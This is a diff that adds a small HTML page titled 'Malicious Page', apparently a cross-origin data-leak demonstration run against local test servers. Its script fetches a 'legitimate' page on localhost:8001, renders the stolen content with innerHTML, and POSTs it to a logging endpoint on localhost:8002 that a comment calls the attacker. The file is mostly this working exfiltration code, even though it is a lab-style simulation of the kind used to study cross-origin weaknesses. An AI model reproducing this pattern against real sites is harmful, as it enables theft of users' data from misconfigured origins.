@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>Malicious Page</title>
+  </head>
+  <body>
+    <h2>Leaked content from legitimate:</h2>
+    <div id="output" style="border:1px solid red; padding:10px;"></div>
+
+    <script>
+      fetch("http://localhost:8001/legitimate.html")
+        .then(res => res.text())
+        .then(data => {
+          // Show data in the attacker webpage
+          document.getElementById("output").innerHTML = data;
+
+          //Simulate a POST request for sending data to attacker
+          fetch("http://localhost:8002/log", {
+            method: "POST",
+            body: data
+          });
+        })
+        .catch(err => { output.textContent = "Blocked by error: " + err; });
+    </script>
+  </body>
+</html>
+
